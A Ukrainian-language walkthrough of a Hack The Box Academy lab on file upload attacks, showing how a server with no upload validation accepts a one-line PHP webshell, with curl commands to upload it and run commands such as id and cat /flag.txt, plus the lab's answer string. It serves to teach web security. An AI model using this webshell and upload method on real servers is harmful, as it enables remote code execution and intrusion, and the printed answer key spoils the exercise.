## File Uploads — Absent Validation: пряме завантаження PHP shell

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Absent Validation](https://academy.hackthebox.com/app/module/136/section/1260)
**Завдання:** Завантажити PHP script → виконати `hostname`
**Відповідь:** `ng-2291638-fileuploadsabsentverification-0qhde-757cd88894-h5nr9`

***

## Концепція

**Absent Validation** — сервер взагалі не перевіряє тип файлу при завантаженні. Будь-який файл, включно з `.php`, приймається і зберігається у публічній директорії → пряме виконання через HTTP.

***

## Кроки

### Крок 1 — Створити webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

### Крок 2 — Завантажити без обмежень

```bash
TARGET="http://TARGET_IP:PORT"

curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/shell.php;type=application/octet-stream"
# File successfully uploaded
```

### Крок 3 — RCE

```bash
# Виконуємо hostname
curl -s "$TARGET/uploads/shell.php?cmd=hostname"

# Інші корисні команди
curl -s "$TARGET/uploads/shell.php?cmd=id"
curl -s "$TARGET/uploads/shell.php?cmd=ls+/"
curl -s "$TARGET/uploads/shell.php?cmd=cat+/flag.txt"
```

***

## Чому це працює

Сервер не перевіряє:
- MIME type (`Content-Type`)
- Розширення файлу (`.php`)
- Вміст файлу (magic bytes)

PHP файл зберігається в `uploads/` який є публічним webroot → Apache/Nginx виконує `.php` файли → RCE.

***

## Відповідь

```
ng-2291638-fileuploadsabsentverification-0qhde-757cd88894-h5nr9
```
